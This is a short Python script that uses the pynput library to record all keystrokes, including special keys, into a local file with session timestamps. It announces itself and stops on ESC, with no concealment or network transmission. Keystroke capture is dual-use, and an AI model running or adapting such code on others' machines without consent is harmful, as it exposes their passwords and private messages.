from pynput import keyboard
from datetime import datetime
import os

LOG_FILE = "keylog.txt"
BUFFER_SIZE = 10  # write to file every N keys

buffer = []

def flush_buffer():
    if buffer:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write("".join(buffer))
        buffer.clear()

def on_press(key):
    try:
        char = key.char
    except AttributeError:
        # special keys (space, enter, backspace, etc.)
        special_map = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n[ENTER]\n",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.shift: "",
            keyboard.Key.esc: None,  # signal to stop
        }
        char = special_map.get(key, f"[{key}]")

    if char is None:
        flush_buffer()
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"\n--- Session ended {datetime.now()} ---\n")
        return False  # stops the listener

    buffer.append(char)
    if len(buffer) >= BUFFER_SIZE:
        flush_buffer()

def main():
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n--- Session started {datetime.now()} ---\n")

    print(f"Logging keystrokes to {os.path.abspath(LOG_FILE)}. Press ESC to stop.")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()